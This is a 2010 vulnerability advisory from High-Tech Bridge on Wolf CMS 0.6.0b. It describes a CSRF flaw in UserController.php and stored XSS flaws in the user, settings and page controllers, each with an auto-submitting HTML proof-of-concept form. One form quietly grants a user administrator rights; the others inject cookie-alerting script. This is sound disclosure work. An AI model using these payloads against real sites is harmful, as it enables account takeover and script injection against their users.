@@ -1,0 +1,124 @@
+Vulnerability ID: HTB22681
+Reference: http://www.htbridge.ch/advisory/xsrf_csrf_in_wolf_cms.html
+Product: Wolf CMS
+Vendor: Wolf CMS team ( http://www.wolfcms.org/ ) 
+Vulnerable Version: 0.6.0b and probably prior versions
+Vendor Notification: 09 November 2010 
+Vulnerability Type: CSRF (Cross-Site Request Forgery)
+Status: Fixed by Vendor
+Risk level: Low 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+CSRF Vulnerability:
+Vulnerability Details:
+The vulnerability exists due to failure in the "wolf/app/controllers/UserController.php" script to properly verify the source of HTTP request.
+
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+Attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/admin/?/user/edit/USER_ID" method="post" name="main">
+<input type="hidden" name="user[name]" value="username">
+<input type="hidden" name="user[email]" value="myemail@example.com">
+<input type="hidden" name="user[password]" value="">
+<input type="hidden" name="user[confirm]" value="">
+<input type="hidden" name="user_permission[administrator]" value="1">
+<input type="hidden" name="user_permission[developer]" value="2">
+<input type="hidden" name="user_permission[editor]" value="3">
+<input type="hidden" name="user[language]" value="en">
+<input type="hidden" name="commit" value="Save">
+</form>
+<script>
+document.main.submit();
+</script>
+
+XSS Vulnerability in UserController.php:
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "wolf/app/controllers/UserController.php" script to properly sanitize user-supplied input in "user[name]" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/admin/?/user/add" method="post" name="main">
+<input type="hidden" name="user[name]" value='"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="user[email]" value="">
+<input type="hidden" name="user[username]" value="">
+<input type="hidden" name="user[password]" value="">
+<input type="hidden" name="user[confirm]" value="">
+<input type="hidden" name="user[language]" value="pl">
+<input type="hidden" name="commit" value="Save">
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+XSS Vulnerability in SettingController.php:
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "wolf/app/controllers/SettingController.php" script to properly sanitize user-supplied input in "setting[admin_title]" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/admin/?/setting" method="post" name="main">
+
+<input type="hidden" name="setting[admin_title]" value='Wolf CMS"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="setting[admin_email]" value="email@example.com">
+<input type="hidden" name="setting[language]" value="pl">
+<input type="hidden" name="setting[theme]" value="brown_and_green">
+<input type="hidden" name="setting[default_tab]" value="page">
+<input type="hidden" name="setting[default_status_id]" value="1">
+<input type="hidden" name="setting[default_filter_id]" value="">
+<input type="hidden" name="commit" value="Save">
+
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+XSS Vulnerability in PageController.php:
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "wolf/app/controllers/PageController.php" script to properly sanitize user-supplied input in "page[description]" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/admin/?/page/edit/PAGE_ID" method="post" name="main">
+
+<input type="hidden" name="page[parent_id]" value="1">
+<input type="hidden" name="page[title]" value="Page title">
+<input type="hidden" name="page[slug]" value="sef_url">
+<input type="hidden" name="page[breadcrumb]" value="breadcrumb">
+<input type="hidden" name="page[keywords]" value="">
+<input type="hidden" name="page[description]" value='descr"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="page_tag[tags]" value="">
+<input type="hidden" name="page[layout_id]" value="">
+<input type="hidden" name="page[behavior_id]" value="">
+<input type="hidden" name="page[created_on]" value="2010-10-22">
+<input type="hidden" name="page[created_on_time]" value="06:15:18">
+<input type="hidden" name="page[published_on]" value="2010-10-22">
+<input type="hidden" name="page[published_on_time]" value="06:15:18">
+<input type="hidden" name="page[needs_login]" value="2">
+<input type="hidden" name="part[0][name]" value="body">
+<input type="hidden" name="part[0][id]" value="11">
+<input type="hidden" name="part[0][filter_id]" value="textile">
+<input type="hidden" name="part[0][content]" value="This is a page">
+<input type="hidden" name="part[1][name]" value="sidebar">
+<input type="hidden" name="part[1][id]" value="12">
+<input type="hidden" name="part[1][filter_id]" value="">
+<input type="hidden" name="part[1][content]" value="">
+<input type="hidden" name="page[status_id]" value="100">
+<input type="hidden" name="commit" value="Save and Close">
+
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+Solution: Upgrade to the most recent version
+
